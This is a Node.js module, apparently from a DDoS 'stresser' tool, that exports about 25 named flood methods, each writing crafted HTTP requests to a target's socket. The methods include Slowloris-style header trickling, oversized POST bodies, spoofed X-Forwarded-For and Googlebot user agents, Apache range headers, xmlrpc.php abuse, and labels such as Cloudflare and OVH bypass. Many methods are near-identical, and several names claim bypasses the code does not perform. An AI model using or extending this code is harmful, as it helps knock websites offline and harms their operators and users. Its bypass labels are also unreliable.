const crypto = require('crypto');

module.exports = {
    CFB: (socket, target, kbSize) => {
        const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\nAccept: */*\r\n\r\n`;
        socket.write(payload);
    },

    BYPASS: (socket, target, kbSize) => {
        const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\nAccept: */*\r\n\r\n`;
        socket.write(payload);
    },

    GET: (socket, target, kbSize) => {
        const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\n\r\n`;
        socket.write(payload);
    },

    POST: (socket, target, kbSize) => {
        const body = 'a'.repeat(kbSize * 1024); 
        const payload = `POST ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\nContent-Length: ${body.length}\r\n\r\n${body}`;
        socket.write(payload);
    },

    OVH: (socket, target, kbSize) => {
        const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\nX-Forwarded-For: ${crypto.randomBytes(4).join('.')}\r\n\r\n`;
        socket.write(payload);
    },

    STRESS: (socket, target, kbSize) => {
        const body = 'a'.repeat(kbSize * 1024); 
        const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\nContent-Length: ${body.length}\r\n\r\n${body}`;
        socket.write(payload);
    },

    DYN: (socket, target, kbSize) => {
        const subdomain = crypto.randomBytes(8).toString('hex');
        const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${subdomain}.${target.hostname}\r\n\r\n`;
        socket.write(payload);
    },

    SLOW: (socket, target, kbSize) => {
        const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\n`;
        socket.write(payload);
        setInterval(() => {
            socket.write(`X-a: ${crypto.randomBytes(4).toString('hex')}\r\n`);
        }, 1000);
    },

    HEAD: (socket, target, kbSize) => {
        const payload = `HEAD ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\n\r\n`;
        socket.write(payload);
    },

    NULL: (socket, target, kbSize) => {
        const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\nUser-Agent: null\r\n\r\n`;
        socket.write(payload);
    },

    COOKIE: (socket, target, kbSize) => {
        const cookie = `cookie=${crypto.randomBytes(16).toString('hex')}`;
        const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\nCookie: ${cookie}\r\n\r\n`;
        socket.write(payload);
    },

    PPS: (socket, target, kbSize) => {
        const payload = `GET / HTTP/1.1\r\n\r\n`;
        socket.write(payload);
    },

    EVEN: (socket, target, kbSize) => {
        const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\nX-Header-1: ${crypto.randomBytes(4).toString('hex')}\r\nX-Header-2: ${crypto.randomBytes(4).toString('hex')}\r\n\r\n`;
        socket.write(payload);
    },

    GSB: (socket, target, kbSize) => {
        const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\nUser-Agent: Googlebot/2.1\r\n\r\n`;
        socket.write(payload);
    },

    DGB: (socket, target, kbSize) => {
        const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\nAccept: */*\r\n\r\n`;
        socket.write(payload);
    },

    AVB: (socket, target, kbSize) => {
        const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\nX-Forwarded-For: ${crypto.randomBytes(4).join('.')}\r\n\r\n`;
        socket.write(payload);
    },

    CFBUAM: (socket, target, kbSize) => {
        const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\nAccept: */*\r\n\r\n`;
        socket.write(payload);
    },

    APACHE: (socket, target, kbSize) => {
        const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\nRange: bytes=0-, 5-10, 15-20\r\n\r\n`;
        socket.write(payload);
    },

    XMLRPC: (socket, target, kbSize) => {
        const payload = `POST /xmlrpc.php HTTP/1.1\r\nHost: ${target.hostname}\r\nContent-Length: ${kbSize * 1024}\r\n\r\n`;
        socket.write(payload);
    },

    BOT: (socket, target, kbSize) => {
        const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\nUser-Agent: Googlebot/2.1\r\n\r\n`;
        socket.write(payload);
    },

    BOMB: (socket, target, kbSize) => {
        const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\n\r\n`;
        socket.write(payload);
    },

    DOWNLOADER: (socket, target, kbSize) => {
        const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\nRange: bytes=0-${kbSize * 1024}\r\n\r\n`;
        socket.write(payload);
    },

    KILLER: (socket, target, kbSize) => {
        const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\n\r\n`;
        socket.write(payload);
    },

    TOR: (socket, target, kbSize) => {
        const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\nUser-Agent: TorBrowser/11.0.1\r\n\r\n`;
        socket.write(payload);
    },

    RHEX: (socket, target, kbSize) => {
        const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\nX-Random: ${crypto.randomBytes(16).toString('hex')}\r\n\r\n`;
        socket.write(payload);
    },

    STOMP: (socket, target, kbSize) => {
        const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\nX-Captcha: bypass\r\n\r\n`;
        socket.write(payload);
    },
};
